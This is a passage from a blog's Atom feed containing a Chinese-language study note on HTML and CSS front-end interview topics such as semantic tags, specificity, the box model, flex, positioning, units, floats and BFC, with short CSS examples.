id="不同-tab-之间通信？"><a href="#不同-tab-之间通信？" class="headerlink" title="不同 tab 之间通信？"></a>不同 tab 之间通信？</h2><p>[面试官：前端跨页面通信，你知道哪些方法？](</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;本文是我在复习浏览器相关知识，准备实习面试时整理的笔记，参考自一些已经整理好的博客：&lt;a href=&quot;https://juejin.cn/p</summary>
      
    
    
    
    <category term="面试准备" scheme="https://asura1211.github.io/categories/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87/"/>
    
    
    <category term="浏览器" scheme="https://asura1211.github.io/tags/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title>【面试准备】— — CSS篇</title>
    <link href="https://asura1211.github.io/2021/06/29/%E3%80%90%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E3%80%91%E2%80%94%20%E2%80%94%20HTML+CSS%E7%AF%87/"/>
    <id>https://asura1211.github.io/2021/06/29/%E3%80%90%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E3%80%91%E2%80%94%20%E2%80%94%20HTML+CSS%E7%AF%87/</id>
    <published>2021-06-29T10:24:40.000Z</published>
    <updated>2021-12-01T13:04:34.373Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文是我在复习CSS，准备实习面试时整理的笔记，参考自一些已经整理好的博客：<a href="https://github.com/CavsZhouyou/Front-End-Interview-Notebook/blob/master/Css/Css.md">CSS 面试知识点总结</a>。侵权删。</p><p>以下是自己整理的前端面试需要准备的知识点：<img src="https://i.loli.net/2021/10/19/3yo9UrOEmZdK7H2.png" alt="前端面试思维导图 _1_.png"></p><h1 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h1><h2 id="HTML5-新特性"><a href="#HTML5-新特性" class="headerlink" title="HTML5 新特性"></a>HTML5 新特性</h2><ol><li><p><strong>H5 语义化</strong></p></li><li><p><strong>多媒体标签</strong></p><ul><li><p>audio: 定义音频内容。</p></li><li><p>video: 定义视频内容。</p></li><li><p>source: 定义多媒体资源路径。</p></li><li><p>embed: 定义嵌入的内容，比如插件。</p></li><li><p>track: 定义引入字幕文件或其他包含文本的文件。</p></li></ul></li><li><p>Canvas绘图</p></li><li><p><strong>WebStorage</strong></p></li><li><p><strong>WebSocket</strong></p></li></ol><h3 id="如何理解-html-语义化？（同-h5-新增标签）"><a href="#如何理解-html-语义化？（同-h5-新增标签）" class="headerlink" title="如何理解 html 语义化？（同 h5 新增标签）"></a>如何理解 html 语义化？（同 h5 新增标签）</h3><p>HTML 语义化的核心是反对大篇幅的使用无语义化的 div + css + span，而鼓励使用 HTML 定义好的语义化标签。</p><ol><li><p>header 代表网页或 section 的页眉，通常需要包含 h1~h6 或者 hgroup。</p></li><li><p>hgroup 代表网页或 section 的标题组，通常只有同时拥有多个 h1<del>h6 的时候，才会使用 hgroup 将 h1</del>h6 包裹起来。</p></li><li><p>footer 代表网页或 section 的页脚。通常包含一些基本信息，如：作者、相关文档链接、版权资料等。</p></li><li><p>nav 代表页面的导航链接区域。</p></li><li><p>article 代表一个在网页中自成一体的内容，其目的是为了方便开发者独立开发。通常需要包含一个 header/h1~h6 和一个 footer。</p></li><li><p>section 代表文档中的“节”或“段”，表示 HTML 文档中包含的独立部分。</p></li><li><p>aside 代表一块独立的内容区域。通常使用分为两种情况：</p><ul><li>在 article 中：作为主要内容的附属内容</li></ul></li></ol><ul><li>在 article 外：最典型的应用是侧边栏</li></ul><ol start="8"><li>ul 表示项目的无序列表，通常呈现为项目符号列表。</li><li>ol 表示项目的有序列表，通常呈现为编号列表。</li><li>li 表示列表中的项目。</li><li>strong 表示强调突出重点内容，浏览器通常以粗体显示内容。</li></ol><p><strong>作用：</strong></p><ul><li>使HTML结构变得清晰，有利于维护代码和添加样式。</li><li>即使在没有CSS样式的条件下，也能很好地呈现出内容结构、代码结构。</li><li>提升搜索引擎优化(SEO)的效果。爬虫可以依赖于标签来确定上下文和各个关键字的权重。</li><li>方便其他设备监听：屏幕阅读设备、盲人阅读器。</li><li>便于团队开发和维护，语义化更具可读性，遵循<code>W3C</code>标准，可以减少差异化。</li></ul><h3 id="canvas-和-svg-介绍、区别"><a href="#canvas-和-svg-介绍、区别" class="headerlink" title="canvas 和 svg 介绍、区别"></a>canvas 和 svg 介绍、区别</h3><p>canvas 是 html5 提供的新元素，为图形的绘制提供了画布，是图形容器，具体的图形绘制由 JavaScript 来完成。</p><p>svg 已经有了十多年的历史。</p><p><strong>区别：</strong></p><ol><li>canvas 可以看做是一个画布，绘制出来的图形基于像素点，为标量图，会<strong>失真</strong>（可以在canvas中引入jpg或png这类格式的图片，也可以用canvas来做一些图表）；svg绘制的图形为矢量图，不会失真（用来做一些动态的小图标，也用来做地图）。</li><li>canvas在js中绘制；svg在html中绘制。</li><li>canvas支持<strong>颜色</strong>比svg多。</li><li>canvas<strong>无法</strong>对已经绘制的图像进行<strong>修改操作</strong>；svg 可以获取到标签进行操作。</li><li>canvas 能够以 .png 或 .jpg 格式保存结果图形，svg 以单个文件的形式独立存在。</li></ol><h2 id="html-跳转链接用哪个标签实现？如果要从一个新窗口打开链接通过什么属性？"><a href="#html-跳转链接用哪个标签实现？如果要从一个新窗口打开链接通过什么属性？" class="headerlink" title="html 跳转链接用哪个标签实现？如果要从一个新窗口打开链接通过什么属性？"></a>html 跳转链接用哪个标签实现？如果要从一个新窗口打开链接通过什么属性？</h2><p>设置 a 标签的 target 属性即可：<code>&lt; a href=&quot;index.html&quot;  target=&quot;_blank&quot; &gt;首页&lt;/a&gt;</code></p><p>不加 target=”_blank” 的话超链接会覆盖本页面，加上则重新打开一个窗体</p><h2 id="iframe-框架及其优缺点"><a href="#iframe-框架及其优缺点" class="headerlink" title="iframe 框架及其优缺点"></a>iframe 框架及其优缺点</h2><p><strong>使用场景</strong>：</p><p>加载其他域的网页</p><p><strong>缺点</strong>：</p><ol><li><code>iframes</code>阻塞页面加载，影响网页加载速度，<code>iframe</code>加载完毕后才会触发<code>window.onload</code>事件，动态设置<code>src</code>可解决这个问题。</li><li>加载了新页面，增加了<code>css</code>与<code>js</code>文件的请求，即额外增加了<code>HTTP</code>请求，增加了服务器负担。</li><li>有时<code>iframe</code>由于页面挤占空间的原因出现滚动条，造成布局混乱。</li><li>不利于<code>SEO</code>，搜索引擎的爬虫无法解读<code>iframe</code>的页面。</li><li>有些小型的移动设备如手机等无法完全显示框架，兼容性较差。</li></ol><h1 id="CSS基础知识"><a href="#CSS基础知识" class="headerlink" title="CSS基础知识"></a>CSS基础知识</h1><h2 id="CSS-选择器优先级？（高频）"><a href="#CSS-选择器优先级？（高频）" class="headerlink" title="CSS 选择器优先级？（高频）"></a>CSS 选择器优先级？（高频）</h2><p>CSS的优先级是根据样式声明的特殊性值来判断的。选择器的特殊性值分为四个等级，如下：</p><p>（1）标签内选择符  x,0,0,0<br>（2）ID选择符  0,x,0,0<br>（3）class选择符/属性选择符/伪类选择符  0,0,x,0<br>（4）元素和伪元素选择符  0,0,0,x</p><p><strong>计算方法：</strong></p><p>（1）每个等级的初始值为0<br>（2）每个等级的叠加为选择器出现的次数相加<br>（3）不可进位，比如0,99,99,99<br>（4）依次表示为：0,0,0,0<br>（5）每个等级计数之间没关联<br>（6）等级判断从左向右，如果某一位数值相同，则判断下一位数值<br>（7）如果两个优先级相同，则最后出现的优先级高，!important也适用<br>（8）通配符选择器的特殊性值为：0,0,0,0<br>（9）继承样式优先级最低，通配符样式优先级高于继承样式<br>（10）!important（权重），它没有特殊性值，但它的优先级是最高的，为了方便记忆，可以认为它的特殊性值为1,0,0,0,0。</p><p><strong>注意：</strong><br>（1）样式应用时，css会先查看规则的权重（!important），加了权重的优先级最高，当权重相同的时候，会比较规则的特殊性。</p><p>（2）特殊性值越大的声明优先级越高。</p><p>（3）相同特殊性值的声明，根据样式引入的顺序，后声明的规则优先级高（距离元素出现最近的）</p><p>  (4) 部分浏览器由于字节溢出问题出现的进位表现不做考虑</p><h2 id="盒模型（高频）"><a href="#盒模型（高频）" class="headerlink" title="盒模型（高频）"></a>盒模型（高频）</h2><p><strong>标准CSS盒子模型</strong>与<strong>低版本IE盒子模型</strong>的区别？</p><ul><li>标准（W3C）盒子模型：<code>width</code> = 内容宽度<code>（content） + border + padding + margin</code></li><li>低版本IE盒子模型： <code>width</code> = 内容宽度<code>（content + border + padding）+ margin</code></li></ul><p>区别： 标准盒子模型 盒子的<code>height</code>和<code>width</code>是<code>content</code>（内容）的宽高，而IE盒子模型盒子的宽高则包括<code>content+padding+border</code>部分。</p><h3 id="box-sizing-属性？"><a href="#box-sizing-属性？" class="headerlink" title="box-sizing 属性？"></a><strong>box-sizing 属性？</strong></h3><p>用来控制元素的盒子模型的解析模式，默认为content-box</p><ul><li>context-box：W3C的标准盒子模型</li><li>border-box：IE传统盒子模型</li></ul><h2 id="Flex-相关（高频）"><a href="#Flex-相关（高频）" class="headerlink" title="Flex 相关（高频）"></a>Flex 相关（高频）</h2><p>Flex “弹性布局”是 <strong>CSS3 新增</strong>的一种布局方式，用来为盒状模型提供最大的灵活性。任何一个容器都可以指定为flex布局，行内元素也可以使用 flex布局。通过将一个元素的 display 属性值设置为 flex 从而采用 flex 布局，但是子元素的 float、clear 和 vertical-align 属性将失效。</p><p>采用 Flex 布局的元素，称为 Flex 容器，它的所有子元素称为 Flex 项目。容器默认存在两根轴：<strong>水平的主轴</strong>和<strong>垂直的交叉轴</strong>，项目默认沿主轴排列。</p><p>具体见<a href="https://juejin.cn/post/6866914148387651592">「一劳永逸」48张小图带你领略flex布局之美</a></p><h3 id="flex-属性"><a href="#flex-属性" class="headerlink" title="flex 属性"></a>flex 属性</h3><p>容器的属性：</p><ul><li><p>flex-direction：决定主轴的方向（即项目的排列方向）。</p></li><li><p>flex-wrap：如果一条轴线排不下，是否换行。</p></li><li><p>flex-flow：是 flex-direction 属性和 flex-wrap 属性的简写形式，默认值为 row nowrap。</p></li><li><p><strong>justify-content</strong>：项目在<strong>主轴</strong>上的对齐方式。</p></li><li><p><strong>align-items</strong>：项目在<strong>交叉轴</strong>上的对齐方式。</p></li><li><p>align-content：多根轴线的对齐方式。</p></li></ul><p>项目的属性：</p><ul><li>order：设置排列顺序。数值越小，排列越靠前，默认为0。</li><li>flex-grow：设置<strong>扩展比例</strong>。</li><li>flex-shrink：设置<strong>收缩比例</strong>。</li><li>flex-basis：设置<strong>基准大小</strong>，默认值为 auto，即项目的本来大小。</li><li>flex：是 flex-grow，flex-shrink 和 flex-basis 的简写，默认值为 0 1 auto。</li></ul><h3 id="flex-1-的含义（高频）"><a href="#flex-1-的含义（高频）" class="headerlink" title="flex:1 的含义（高频）"></a>flex:1 的含义（高频）</h3><p>flex:1 =&gt; flex: 1 1 auto，另外两种完整写法是 <strong>initial (0 1 auto)</strong> 和 <strong>none (0 0 auto)</strong></p><p>flex:3 =&gt; flex: 3 1 auto;</p><ul><li>第一个参数表示: <strong>flex-grow 定义项目的放大比例，默认为0，即如果存在剩余空间，也不放大</strong></li><li>第二个参数表示: <strong>flex-shrink 定义了项目的缩小比例，默认为1，即如果空间不足，该项目将缩小</strong></li><li>第三个参数表示: <strong>flex-basis</strong> 给上面两个属性分配多余空间之前，计算项目是否有多余空间。</li></ul><h2 id="display-属性？（高频）"><a href="#display-属性？（高频）" class="headerlink" title="display 属性？（高频）"></a>display 属性？（高频）</h2><ul><li>block    块类型。默认宽度为父元素宽度，可设置宽高，换行显示。</li><li>none    元素不显示，并从文档流中移除。</li><li>inline    行内元素类型。默认宽度为内容宽度，不可设置宽高，同行显示。</li><li>inline-block 默认宽度为内容宽度，可以设置宽高，同行显示。</li><li>list-item    像块类型元素一样显示，并添加样式列表标记。</li><li>table    此元素会作为块级表格来显示。</li><li>inherit    规定应该从父元素继承display属性的值。</li></ul><h2 id="position-属性？（高频）"><a href="#position-属性？（高频）" class="headerlink" title="position 属性？（高频）"></a>position 属性？（高频）</h2><ul><li>absolute：绝对定位，相对于值<strong>不为 static 的第一个父元素 padding box 的左上角</strong>进行定位。（脱离文档流）</li><li>fixed：绝对定位，相对于<strong>浏览器窗口</strong>进行定位。（脱离文档流）</li><li>relative：相对定位，相对于<strong>元素本身所在位置</strong>进行定位。</li><li>sticky：粘性定位，依赖于用户的滚动，在 <code>position:relative</code> 与 <code>position:fixed</code> 定位之间切换。行为像 relative; 而当页面滚动超出目标区域时，像 fixed。</li><li>static：默认值。<strong>没有定位</strong>，元素出现在正常的流中。</li><li>inherit：从父元素继承 position 属性的值。</li></ul><h3 id="sticky定位使用场景？"><a href="#sticky定位使用场景？" class="headerlink" title="sticky定位使用场景？"></a>sticky定位使用场景？</h3><p>吸顶，返回文档最顶部按钮（指定 top, right, bottom 或 left 四个阈值之一，才可使粘性定位生效）</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.sticky</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: sticky;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="无依赖绝对定位是什么？"><a href="#无依赖绝对定位是什么？" class="headerlink" title="无依赖绝对定位是什么？"></a>无依赖绝对定位是什么？</h3><p>没有设置 left/top/right/bottom 属性值的绝对定位称为“无依赖绝对定位”，其定位的位置和没有设置<code>position:absolute</code> 时的位置相关。</p><h3 id="绝对定位元素与非绝对定位元素百分比计算的区别？"><a href="#绝对定位元素与非绝对定位元素百分比计算的区别？" class="headerlink" title="绝对定位元素与非绝对定位元素百分比计算的区别？"></a>绝对定位元素与非绝对定位元素百分比计算的区别？</h3><ul><li><p>绝对定位元素：宽高百分比相对于临近的 position 不为 static 的祖先元素的 padding box 来计算。</p></li><li><p>非绝对定位元素：宽高百分比则是相对于父元素的 content box 来计算的。</p></li></ul><h3 id="什么是包含块，对于包含块的理解"><a href="#什么是包含块，对于包含块的理解" class="headerlink" title="什么是包含块，对于包含块的理解?"></a>什么是包含块，对于包含块的理解?</h3><p>包含块（containing block）：元素用来计算和定位的一个框。</p><p>（1）根元素（很多场景下可以看成是<html>）被称为“初始包含块”，其尺寸等同于浏览器可视窗口的大小。</p><p>（2）如果元素position是relative或者static，则“包含块”由其最近的块容器祖先盒的content box边界形成。</p><p>（3）如果元素position:fixed，则“包含块”是“初始包含块”。</p><p>（4）如果元素position:absolute，则“包含块”由最近的position不为static的祖先元素建立，边界是padding box。</p><h3 id="display、position-和-float-的相互关系？"><a href="#display、position-和-float-的相互关系？" class="headerlink" title="display、position 和 float 的相互关系？"></a>display、position 和 float 的相互关系？</h3><p>（1）首先判断display属性是否为none，如果为none，则position和float属性的值不影响元素的表现。</p><p>（2）然后判断position的值是否为absolute或者fixed，如果是，则float属性失效。</p><p>（3）接着判断float属性的值是否为none，如果不是，且position的值为relative，则relative相对于浮动后的最终位置定位。</p><p>（4）如果float的值为none，则判断元素是否为根元素，如果不是，则保持指定的display属性值不变。</p><p>总的来说，可以把它看作是一个类似优先级的机制，”position:absolute”和”position:fixed”优先级最高，有它存在<br>的时候，浮动不起作用，’display’的值也需要调整；其次，元素的’float’特性的值不是”none”的时候或者它是根元素<br>的时候，调整’display’的值；最后，非根元素，并且非浮动元素，并且非绝对定位的元素，’display’特性值同设置值。</p><h3 id="absolute-与-overflow-的关系？"><a href="#absolute-与-overflow-的关系？" class="headerlink" title="absolute 与 overflow 的关系？"></a>absolute 与 overflow 的关系？</h3><p>（1）如果overflow不是定位元素，同时绝对定位元素和overflow容器之间也没有定位元素，则overflow无法对absolute元素进行剪裁。</p><p>（2）如果overflow的属性值不是hidden而是auto或者scroll，即使绝对定位元素高宽比overflow元素高宽还要大，也都不会出现滚动条。</p><p>（3）overflow元素自身transform的时候，Chrome和Opera浏览器下的overflow剪裁是无效的。</p><h2 id="移动端主流布局方案（高频）"><a href="#移动端主流布局方案（高频）" class="headerlink" title="移动端主流布局方案（高频）"></a>移动端主流布局方案（高频）</h2><ol><li><p>单独制作移动端页面（主流）</p><ul><li>流式布局（百分比布局）：通过盒子的宽度设置成百分比来根据屏幕的<strong>宽度</strong>来进行伸缩，不受固定像素的限制，内容向两侧填充。</li><li><strong>px为主，vx和（vw/vh/vmax/vmin）为辅，搭配 flex（强烈推荐）</strong></li><li>less+rem+媒体查询布局</li><li>混合布局</li></ul></li><li><p>响应式页面兼容移动端</p><ul><li><p>媒体查询</p></li><li><p>bootstarp</p></li></ul></li></ol><h3 id="rem-布局原理和优缺点？"><a href="#rem-布局原理和优缺点？" class="headerlink" title="rem 布局原理和优缺点？"></a>rem 布局原理和优缺点？</h3><p>使用rem为元素设定字体大小时，仍然是相对大小，但相对的只是HTML根元素。</p><p>优点：在屏幕分辨率千差万别的时代，只要将 rem 与屏幕分辨率关联起来就可以实现页面的整体缩放，使得<strong>在设备上的展现统一</strong>，兼容性也非常好。</p><p>缺点：</p><ol><li>在奇葩的 dpr 设备上表现效果不太好。</li><li>使用 iframe 引用也会出现问题。</li><li>rem 在多屏幕尺寸适配上与当前两大平台的设计哲学不一致。即大屏的出现到底是为了看得又大又清楚，还是为了看的更多的问题。</li></ol><h3 id="px、rpx、rem、em、vw、vh（高频）"><a href="#px、rpx、rem、em、vw、vh（高频）" class="headerlink" title="px、rpx、rem、em、vw、vh（高频）"></a>px、rpx、rem、em、vw、vh（高频）</h3><ol><li><p>px：固定的像素，一旦设置了就无法因为适应页面大小而改变。</p></li><li><p>rpx：响应式的像素单位，可以根据屏幕宽度进行自适应，不论大小屏幕，规定屏幕宽为 750rpx。</p></li><li><p>em：相对长度单位。相对于<strong>当前对象内文本</strong>的字体尺寸。如当前行内文本的字体尺寸未被人为设置，则相对于浏览器的默认字体尺寸（<code>1em = 16px</code>）。</p><p><strong>特点：</strong></p><ul><li><p>em 的值并不固定</p></li><li><p>em 会继承父级元素的字体大小</p></li><li><p>任意浏览器的默认字体高都是 16px</p></li></ul></li><li><p>rem：相对单位，相对的只是<strong>HTML根元素</strong><code>font-size</code>的值。</p></li><li><p>vh、vw：vw 是根据<strong>窗口</strong>的宽度，分成100等份（vw 始终是针对窗口的宽）。vh 则为窗口的高度。</p></li><li><p>vmin：相对于视口的宽度或高度中<strong>较小</strong>的那个。</p></li></ol><p><strong>使用场景：</strong></p><ul><li>对于只需要适配少部分移动设备，且分辨率对页面影响不大的，使用px即可 。</li><li>对于需要适配各种移动设备，使用rem，例如需要适配iPhone和iPad等分辨率差别比较挺大的设备。</li></ul><h3 id="设备像素、css-像素、设备独立像素、dpr、ppi"><a href="#设备像素、css-像素、设备独立像素、dpr、ppi" class="headerlink" title="设备像素、css 像素、设备独立像素、dpr、ppi"></a>设备像素、css 像素、设备独立像素、dpr、ppi</h3><p>物理像素 / <strong>设备像素</strong>：一般手机的分辨率指的就是设备像素，一个设备的设备像素是不可变的。</p><p>css 像素 / <strong>dp（设备独立像素）</strong>：不管在何种分辨率的设备上，css 像素的大小应该是一致的，是一个相对单位，相对于设备像素的。一个 css 像素的大小取决于页面缩放程度和 dpr 的大小。<code>chrome</code>的开发者工具可以模拟各个手机型号的显示情况，每种型号上面会显示一个尺寸，比如<code>iPhone X</code>显示的尺寸是<code>375x812</code>，实际<code>iPhone X</code>的分辨率会比这高很多，这里显示的就是设备独立像素。</p><p><strong>dpr（设备像素比）</strong>：物理像素和设备独立像素的比值，一般的 pc 屏幕，dpr=1。屏幕的缩放会改变 dpr 的值。</p><ul><li>在<code>web</code>中，通过<code>window.devicePixelRatio</code>获取<code>dpr</code>。</li></ul><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="keyword">@media</span> (<span class="attribute">-webkit-min-device-pixel-ratio</span>: <span class="number">2</span>),(<span class="attribute">min-device-pixel-ratio</span>: <span class="number">2</span>)&#123; &#125;</span><br></pre></td></tr></table></figure><p>ppi：每英寸的物理像素的密度，ppi越大，屏幕的分辨率越大。</p><h3 id="layout-viewport、visual-viewport-和-ideal-viewport-的区别？"><a href="#layout-viewport、visual-viewport-和-ideal-viewport-的区别？" class="headerlink" title="*layout viewport、visual viewport 和 ideal viewport 的区别？"></a>*layout viewport、visual viewport 和 ideal viewport 的区别？</h3><ul><li><p>布局视口：在移动端显示网页时，由于移动端的屏幕尺寸比较小，如果网页使用移动端的屏幕尺寸进行布局的话，整个页面的布局都会显示错乱。所以移动端浏览器提供了layout viewport的概念，使用这个视口来对页面进行布局展示，一般layout viewport的大小为980px，因此页面布局不会有太大的变化，可以通过拖动和缩放来查看这个页面。</p></li><li><p>视觉视口：visual viewport指的是移动设备上我们<strong>可见的区域视口大小</strong>，一般为屏幕的分辨率大小。visual viewport和layout viewport的关系，就像是我们通过窗户看外面的风景，视觉视口就是窗户，而外面的风景就是布局视口中的网页内容。</p></li><li><p>理想视口：由于layout viewport一般比visual viewport要大，所以想要看到整个页面必须通过拖动和缩放才能实现。所以又提出了ideal viewport的概念。ideal viewport下用户不用缩放和滚动条就能够查看到整个页面，并且页面在不同分辨率下显示的内容大小相同。ideal viewport其实就是通过修改layout viewport的大小，让它等于设备的宽度。因此根据ideal viewport设计的页面，在不同分辨率的屏幕下，显示应该相同。</p></li></ul><h3 id="响应式布局（高频）"><a href="#响应式布局（高频）" class="headerlink" title="响应式布局（高频）"></a>响应式布局（高频）</h3><p><strong>基本原理：</strong>通过<strong>媒体查询</strong>检测不同的设备屏幕尺寸，为了处理移动端，页面头部必须有meta声明viewport。</p><p><img src="https://i.loli.net/2021/10/25/QkUtjbvApx75sMF.png" alt="image.png"></p><p><strong>媒体查询：</strong>通过媒体查询可以为不同大小和尺寸的媒体定义不同的css，适应相应设备的显示。</p><ol><li><p>&lt;head&gt;里面</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;xxx.css&quot;</span> <span class="attr">media</span>=<span class="string">&quot;only screen and (max-device-width:480px)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>CSS : </p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="keyword">@media</span> <span class="keyword">only</span> screen <span class="keyword">and</span> (<span class="attribute">max-device-width</span>:<span class="number">480px</span>) &#123;<span class="comment">/*css样式*/</span>&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="如何适配的-H5-？（todo）"><a href="#如何适配的-H5-？（todo）" class="headerlink" title="如何适配的 H5 ？（todo）"></a>如何适配的 H5 ？（todo）</h2><h2 id="浮动原理、什么时候需要清除浮动（方式）？（高频todo）"><a href="#浮动原理、什么时候需要清除浮动（方式）？（高频todo）" class="headerlink" title="浮动原理、什么时候需要清除浮动（方式）？（高频todo）"></a>浮动原理、什么时候需要清除浮动（方式）？（高频todo）</h2><p>非IE浏览器下，容器不设定高度且子元素浮动时，容器高度不能被内容撑开。此时内容会溢出到容器外面而影响布局。此类现象被称为浮动（溢出）。</p><p><strong>原理：</strong></p><ul><li>浮动元素脱离文档流，不占据空间（引起“高度塌陷”现象）；</li><li>浮动元素碰到包含它的边框或其他浮动元素的边框停留。</li></ul><p><strong>浮动会带来的问题：</strong></p><ul><li>父级元素的高度将会无法被撑开，影响与父级元素同级的元素</li><li>与浮动元素同级的非浮动元素（内联元素）会跟随其后</li><li>若浮动的元素不是第一个元素，则该元素之前的元素也要浮动，否则会影响页面的显示结构</li></ul><p><strong>清除方式：</strong></p><ul><li>父级盒子定义 height;</li><li>父级盒子定义 zoom ;</li><li>最后一个浮动元素后面加一个div空标签，并且添加样式<code>clear: both</code>;</li><li>包含浮动元素的父级标签添加样式 <code>overflow:hidden/both</code> ;</li><li>使用 BFC 块级格式化上下文来清除浮动</li></ul><p>设置元素浮动后，该元素的display值自动变成display:block。</p><h3 id="clear-属性清除浮动的原理？"><a href="#clear-属性清除浮动的原理？" class="headerlink" title="clear 属性清除浮动的原理？"></a>clear 属性清除浮动的原理？</h3><p><code>clear:none|left|right|both</code> <strong>“元素盒子的边不能和前面的浮动元素相邻”(官方解释)<strong>，对元素设置clear属性是为了</strong>避免浮动元素对该元素的影响</strong>，而不是清除浮动。</p><p>还需要注意的是clear属性指的是元素盒子的边不能和<strong>前面的</strong>浮动元素相邻。因此，当clear:left有效的时候，clear:right必定无效，即clear:left等同于设置clear:both；同样地，clear:right也是。</p><p><strong>一般使用伪元素的方式清除浮动：</strong></p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.clear</span><span class="selector-pseudo">::after</span>&#123;</span><br><span class="line"><span class="attribute">content</span>:<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="attribute">display</span>:table;//也可以是&#x27;block&#x27;，或者是&#x27;list-item&#x27;</span><br><span class="line"><span class="attribute">clear</span>:both;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>clear属性只有块级元素才有效的，而::after等伪元素默认都是内联水平，这就是借助伪元素清除浮动影响时需要设置display属性值的原因。</p><h3 id="zoom-1-的清除浮动原理"><a href="#zoom-1-的清除浮动原理" class="headerlink" title="*zoom:1 的清除浮动原理?"></a>*zoom:1 的清除浮动原理?</h3><p>当设置了zoom的值之后，所设置的元素就会扩大或者缩小，高度宽度会重新计算。一旦改变zoom值，会发生重新渲染，运用这个原理，也就解决了ie下子元素浮动时候父元素不随着自动扩大的问题。</p><h2 id="行内元素和块级元素（高频）"><a href="#行内元素和块级元素（高频）" class="headerlink" title="行内元素和块级元素（高频）"></a>行内元素和块级元素（高频）</h2><p>部分参考自<a href="https://segmentfault.com/a/1190000013966321">前端面试题-行内元素和块级元素</a></p><ul><li>行内元素只占据它<strong>对应标签的边框所包含的空间</strong>。<ul><li>设置宽度 <strong>width 无效</strong>。</li><li>设置高度 <strong>height 无效</strong>，但可以通过 <strong>line-height</strong> 来设置。</li><li>设置 margin 只有 <strong>左右有效，上下无效。</strong></li><li>设置 padding 只有 <strong>左右有效，上下无效</strong>。注意元素范围是增大了，但是对元素周围的内容是没影响的。</li></ul></li><li>块级元素<strong>占据其父元素（容器）的整个空间</strong>，因此创建了一个“块”。</li></ul><h3 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h3><ol><li><p>内容：</p><p>（1）一般情况下，行内元素只能包含<strong>数据和其他行内元素</strong>。</p><p>（2）块级元素可以包含<strong>行内元素和其他块级元素</strong>。这种结构上的包含继承区别可以使块级元素创建比行内元素更”大型“的结构。</p></li><li><p>格式：</p><p>默认情况下，行内元素<strong>不会以新行开始</strong>，而块级元素会<strong>新起一行</strong>。</p></li><li><p>宽高：</p><p>（1）行内元素<strong>不可以</strong>设置宽高</p><p>（2）块级元素<strong>可以</strong>设置宽高</p></li><li><p>内边距和外边距</p><p>（1）行内元素<strong>水平方向</strong>的 margin 和 padding 可以生效。但<strong>竖直方向</strong>的 margin 和 padding 不能生效。</p><p>（2）块级元素可以设置margin，padding</p></li></ol><h3 id="具体元素"><a href="#具体元素" class="headerlink" title="具体元素"></a>具体元素</h3><p>行内元素：</p><table><thead><tr><th>a</th><th>锚点</th></tr></thead><tbody><tr><td>em</td><td>强调</td></tr><tr><td>img</td><td>图片</td></tr><tr><td>input</td><td>输入框</td></tr><tr><td>label</td><td>表格标签</td></tr><tr><td>span</td><td>常用内联容器，定义文本内区块</td></tr><tr><td>strong</td><td>粗体强调</td></tr></tbody></table><p>块级元素：</p><table><thead><tr><th>div</th><th>常用块级容易，也是CSS layout的主要标签</th></tr></thead><tbody><tr><td>form</td><td>交互表单</td></tr><tr><td>h1~h6</td><td>标题</td></tr><tr><td>p</td><td>段落</td></tr><tr><td>table</td><td>表格</td></tr><tr><td>ul、ol</td><td>无(有)序列</td></tr></tbody></table><h2 id="对-BFC-的理解？（高频）"><a href="#对-BFC-的理解？（高频）" class="headerlink" title="对 BFC 的理解？（高频）"></a>对 BFC 的理解？（高频）</h2><p>参考自<a href="https://zhuanlan.zhihu.com/p/25321647">10 分钟理解 BFC 原理</a></p><p>块级格式化上下文（Block Formatting Context，BFC）。<strong>具有 BFC 特性的元素可以看作是隔离了的独立容器，容器里面的元素不会在布局上影响到外面的元素。</strong></p><h3 id="如何创建BFC？"><a href="#如何创建BFC？" class="headerlink" title="如何创建BFC？"></a><strong>如何创建BFC？</strong></h3><p>（1）根元素或包含根元素的元素<br>（2）浮动元素：float 除 none 以外的值<br>（3）绝对定位元素：position 的值为absolute、fixed<br>（4）display 为 inline-block、table-cells、flex<br>（5）overflow 除了 visible 以外的值 (hidden、auto、scroll)(这个是最推荐开启bfc的，副作用最小)</p><h3 id="BFC-应用"><a href="#BFC-应用" class="headerlink" title="BFC 应用"></a>BFC 应用</h3><p><strong>1. 防止外边距折叠</strong></p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*如下情况两个 div 元素都处于同一个 BFC 容器下（body），第一个 div 的下边距和第二个 div 的上边距会发生重叠，距离只有 100px*/</span></span><br><span class="line"><span class="comment">/*html*/</span></span><br><span class="line">&lt;<span class="selector-tag">body</span>&gt;</span><br><span class="line">    &lt;<span class="selector-tag">div</span>&gt;&lt;/<span class="selector-tag">div</span>&gt;</span><br><span class="line">    &lt;<span class="selector-tag">div</span>&gt;&lt;/<span class="selector-tag">div</span>&gt;</span><br><span class="line">&lt;/<span class="selector-tag">body</span>&gt;</span><br><span class="line"><span class="comment">/*css*/</span></span><br><span class="line"><span 